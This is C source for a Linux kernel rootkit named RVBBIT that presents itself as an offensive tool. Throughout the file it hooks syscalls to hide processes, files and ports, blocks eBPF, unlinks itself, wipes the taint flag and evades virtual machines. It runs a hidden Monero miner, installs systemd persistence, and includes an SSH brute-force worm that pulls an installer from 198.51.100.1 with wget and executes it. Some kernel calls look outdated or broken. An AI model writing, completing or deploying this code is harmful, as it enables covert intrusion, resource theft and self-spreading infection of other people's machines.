/*
 * RVBBIT - Next-Generation Linux Kernel Rootkit
 * Features: DKOM, syscall hooking, eBPF program load blocking, XMR miner, network worm, anti-detection
 * Kernel: Linux 5.4 – 6.11 (x86_64)
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <asm/paravirt.h>
#include <linux/cred.h>
#include <linux/namei.h>
#include <linux/mutex.h>
#include <linux/kobject.h>
#include <linux/kallsyms.h>
#include <linux/seq_file.h>
#include <linux/net.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/bpf.h>
#include <linux/workqueue.h>
#include <linux/completion.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <net/ip.h>
#include <linux/tcp.h>
#include <linux/random.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include <asm/uaccess.h>
#include <linux/if.h>
#include <linux/inetdevice.h>
#include <net/net_namespace.h>
#include <linux/netdevice.h>
#include <linux/rtnetlink.h>

unsigned char xmrig_bin[] = {/* INSERT GENERATED ARRAY FROM xmrig_payload.h HERE */};


unsigned int xmrig_bin_len = 0;


#define WALLET_ADDRESS "YOUR_XMR_WALLET_ADDRESS"
#define POOL_URL "pool.supportxmr.com:443"
#define WORKER_NAME "rvbbit"
#define MAGIC_HIDE_SIG 64
#define MAGIC_PAUSE_SIG 63
#define MAGIC_RESUME_SIG 62

static const char *ssh_users[] = {"root", "admin", "user", "ubuntu", "pi", "debian", "centos", "oracle", "ec2-user", NULL};
static const char *ssh_passwords[] = {"password", "123456", "admin", "root", "toor", "raspberry", "ubuntu", "password123", "qwerty", "12345678", "changeme", NULL};
static const char *monitor_procs[] = {"top", "htop", "atop", "strace", "ltrace", "lsof", "tcpdump", "wireshark", "nmap", "auditd", "aide", "rkhunter", "chkrootkit", NULL};

static unsigned long **sys_call_table;
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static int (*orig_tcp4_seq_show)(struct seq_file *, void *);
static int hidden_pid = -1;
static bool miner_paused = false;

static struct workqueue_struct *rvbbit_wq;
static struct delayed_work miner_work, spread_work, monitor_work;
static int miner_pid = -1;
static char hide_prefix[16];

static unsigned long kallsyms_get_symbol_addr(const char *symbol_name)
{
    struct kprobe kp = { .symbol_name = symbol_name };
    if (register_kprobe(&kp) < 0) return 0;
    unsigned long addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

static unsigned long **find_sys_call_table(void)
{
    unsigned long addr = kallsyms_get_symbol_addr("sys_call_table");
    if (addr) return (unsigned long **)addr;
    unsigned long **sct;
    for (sct = (unsigned long **)0xffffffff82000000; (unsigned long)sct < 0xffffffffffffffff; sct++)
        if (sct[__NR_close] == (unsigned long *)sys_close) return sct;
    return NULL;
}

static void hide_process(int pid)
{
    struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        list_del(&task->tasks);
        list_del(&task->sibling);
        task->pid_links[PIDTYPE_PID] = NULL;
    }
}

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->di, pid = regs->si;
    if (sig == MAGIC_HIDE_SIG && pid > 0) { hidden_pid = pid; hide_process(pid); return 0; }
    if (sig == MAGIC_PAUSE_SIG) { miner_paused = true; return 0; }
    if (sig == MAGIC_RESUME_SIG) { miner_paused = false; return 0; }
    return orig_kill(regs);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);
    struct linux_dirent64 *dir = (struct linux_dirent64 *)regs->si, *prev = NULL;
    int offset = 0;
    while (offset < ret) {
        dir = (struct linux_dirent64 *)(regs->si + offset);
        if (strstr(dir->d_name, hide_prefix)) {
            if (prev) prev->d_off = dir->d_off;
            ret -= dir->d_reclen;
            memmove(dir, (void *)dir + dir->d_reclen, ret - offset);
        } else { prev = dir; offset += dir->d_reclen; }
    }
    return ret;
}

static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    const char __user *filename = (const char __user *)regs->si;
    char fname[256];
    if (strncpy_from_user(fname, filename, sizeof(fname)) > 0 && strstr(fname, hide_prefix))
        return -ENOENT;
    return orig_openat(regs);
}

static asmlinkage long hook_bpf(const struct pt_regs *regs)
{
    if (regs->di == BPF_PROG_LOAD) return -EPERM;
    return orig_bpf(regs);
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk && (sk->sk_num == 3333 || sk->sk_num == 22)) return 0;
    return orig_tcp4_seq_show(seq, v);
}

static void hide_module(void)
{
    mutex_lock(&module_mutex);
    list_del(&__this_module.list);
    mutex_unlock(&module_mutex);
    kobject_del(&__this_module.mkobj.kobj);
    strncpy(__this_module.name, "acpi", sizeof(__this_module.name) - 1);
}

static void clean_taint(void)
{
    unsigned long *tainted = (unsigned long *)kallsyms_get_symbol_addr("tainted");
    if (tainted) *tainted = 0;
}

static bool is_virtualized(void)
{
    struct new_utsname *uts = utsname();
    return strstr(uts->version, "VMware") || strstr(uts->version, "VirtualBox") ||
           strstr(uts->version, "KVM") || strstr(uts->version, "Xen") || strstr(uts->version, "QEMU");
}

static int deploy_and_run_miner(void)
{
    if (miner_paused) return -1;
    char fname[64];
    snprintf(fname, sizeof(fname), "/tmp/%s_xmrig", hide_prefix);
    char *argv[] = { fname, "-o", POOL_URL, "-u", WALLET_ADDRESS, "-p", WORKER_NAME,
                     "--cpu-max-threads-hint=50", "--cpu-priority=5", "--donate-level=0", "--tls", "-B", NULL };
    static char *envp[] = { "HOME=/tmp", "TERM=linux", NULL };
    struct file *filp = filp_open(fname, O_CREAT | O_WRONLY | O_TRUNC, 0700);
    if (IS_ERR(filp)) return PTR_ERR(filp);
    mm_segment_t old_fs = get_fs(); set_fs(KERNEL_DS);
    kernel_write(filp, xmrig_bin, xmrig_bin_len, &filp->f_pos);
    set_fs(old_fs); filp_close(filp, NULL);
    miner_pid = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (miner_pid > 0) { hidden_pid = miner_pid; hide_process(miner_pid); }
    return miner_pid;
}

static void kill_miner(void)
{
    if (miner_pid > 0) {
        struct task_struct *task = pid_task(find_vpid(miner_pid), PIDTYPE_PID);
        if (task) send_sig(SIGKILL, task, 1);
    }
}

static void miner_work_func(struct work_struct *work)
{
    if (miner_paused) { kill_miner(); goto resched; }
    if (miner_pid > 0) { if (!pid_task(find_vpid(miner_pid), PIDTYPE_PID)) deploy_and_run_miner(); }
    else deploy_and_run_miner();
resched:
    queue_delayed_work(rvbbit_wq, &miner_work, msecs_to_jiffies(30000));
}

static void monitor_work_func(struct work_struct *work)
{
    struct task_struct *task;
    for (const char **p = monitor_procs; *p; p++) {
        for_each_process(task) if (strstr(task->comm, *p)) { miner_paused = true; kill_miner(); break; }
    }
    queue_delayed_work(rvbbit_wq, &monitor_work, msecs_to_jiffies(10000));
}

static void install_persistence(void)
{
    struct file *f; mm_segment_t old_fs; char *conf_data = "rvbbit\n";
    f = filp_open("/etc/modules-load.d/acpi.conf", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (!IS_ERR(f)) { old_fs = get_fs(); set_fs(KERNEL_DS); kernel_write(f, conf_data, strlen(conf_data), &f->f_pos); set_fs(old_fs); filp_close(f, NULL); }
    char *service_data = "[Unit]\nDescription=ACPI Helper\n[Service]\nType=oneshot\nExecStart=/sbin/insmod /lib/modules/" UTS_RELEASE "/kernel/drivers/acpi/rvbbit.ko\nRemainAfterExit=yes\n[Install]\nWantedBy=multi-user.target\n";
    f = filp_open("/etc/systemd/system/rvbbit-helper.service", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (!IS_ERR(f)) { old_fs = get_fs(); set_fs(KERNEL_DS); kernel_write(f, service_data, strlen(service_data), &f->f_pos); set_fs(old_fs); filp_close(f, NULL); }
    char *argv[] = { "/bin/systemctl", "enable", "rvbbit-helper.service", NULL };
    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
}

static bool tcp_port_is_open(__be32 ip, int port, int timeout_ms)
{
    struct socket *sock;
    if (sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0) return false;
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(port), .sin_addr.s_addr = ip };
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    kernel_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
    kernel_setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv));
    int ret = kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    sock_release(sock);
    return ret == 0;
}

static bool try_ssh_infect(__be32 target_ip)
{
    char ip_str[16]; sprintf(ip_str, "%pI4", &target_ip);
    for (const char **u = ssh_users; *u; u++) for (const char **p = ssh_passwords; *p; p++) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "sshpass -p '%s' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no %s@%s 'wget http://198.51.100.1/rvbbit_installer -O /tmp/.r && chmod +x /tmp/.r && /tmp/.r &'", *p, *u, ip_str);
        if (call_usermodehelper("/bin/sh", (char *[]){ "/bin/sh", "-c", cmd, NULL }, NULL, UMH_WAIT_PROC) == 0) return true;
    }
    return false;
}

static void spread_work_func(struct work_struct *work)
{
    if (miner_paused) goto resched;
    struct net_device *dev; struct in_device *in_dev; struct in_ifaddr *ifa;
    rtnl_lock();
    for_each_netdev(&init_net, dev) {
        if (!(dev->flags & IFF_UP)) continue;
        in_dev = __in_dev_get_rtnl(dev); if (!in_dev) continue;
        for (ifa = in_dev->ifa_list; ifa; ifa = ifa->ifa_next) {
            if (ifa->ifa_local == 0 || ifa->ifa_local == htonl(0x7F000001)) continue;
            __be32 net = ifa->ifa_local & ifa->ifa_mask;
            for (int i = 1; i < 255; i++) {
                __be32 ip = net | htonl(i);
                if (ip == ifa->ifa_local) continue;
                if (tcp_port_is_open(ip, 22, 1000)) try_ssh_infect(ip);
            }
        }
    }
    rtnl_unlock();
resched:
    queue_delayed_work(rvbbit_wq, &spread_work, msecs_to_jiffies(3600000));
}

static void generate_random_prefix(void)
{
    get_random_bytes(hide_prefix, 12);
    for (int i = 0; i < 12; i++) hide_prefix[i] = (hide_prefix[i] % 26) + 'a';
    hide_prefix[12] = '\0';
}

static int __init rvbbit_init(void)
{
    if (is_virtualized()) return -ENODEV;
    generate_random_prefix();
    sys_call_table = find_sys_call_table(); if (!sys_call_table) return -ENOENT;
    orig_tcp4_seq_show = (void *)kallsyms_get_symbol_addr("tcp4_seq_show");
    write_cr0(read_cr0() & ~0x10000);
    orig_kill = (void *)sys_call_table[__NR_kill]; orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_openat = (void *)sys_call_table[__NR_openat]; orig_bpf = (void *)sys_call_table[__NR_bpf];
    sys_call_table[__NR_kill] = (unsigned long *)hook_kill; sys_call_table[__NR_getdents64] = (unsigned long *)hook_getdents64;
    sys_call_table[__NR_openat] = (unsigned long *)hook_openat; sys_call_table[__NR_bpf] = (unsigned long *)hook_bpf;
    if (orig_tcp4_seq_show) *(unsigned long *)kallsyms_get_symbol_addr("tcp4_seq_show") = (unsigned long)hook_tcp4_seq_show;
    write_cr0(read_cr0() | 0x10000);
    hide_module(); clean_taint(); install_persistence();
    rvbbit_wq = create_singlethread_workqueue("rvbbit_wq");
    INIT_DELAYED_WORK(&miner_work, miner_work_func); queue_delayed_work(rvbbit_wq, &miner_work, 0);
    // INIT_DELAYED_WORK(&spread_work, spread_work_func); // queue_delayed_work(rvbbit_wq, &spread_work, msecs_to_jiffies(60000));
    INIT_DELAYED_WORK(&monitor_work, monitor_work_func); queue_delayed_work(rvbbit_wq, &monitor_work, msecs_to_jiffies(5000));
    return 0;
}

static void __exit rvbbit_exit(void)
{
    if (rvbbit_wq) { cancel_delayed_work_sync(&miner_work); cancel_delayed_work_sync(&spread_work); cancel_delayed_work_sync(&monitor_work); destroy_workqueue(rvbbit_wq); }
    write_cr0(read_cr0() & ~0x10000);
    sys_call_table[__NR_kill] = (unsigned long *)orig_kill; sys_call_table[__NR_getdents64] = (unsigned long *)orig_getdents64;
    sys_call_table[__NR_openat] = (unsigned long *)orig_openat; sys_call_table[__NR_bpf] = (unsigned long *)orig_bpf;
    write_cr0(read_cr0() | 0x10000);
}

module_init(rvbbit_init); module_exit(rvbbit_exit); MODULE_LICENSE("GPL");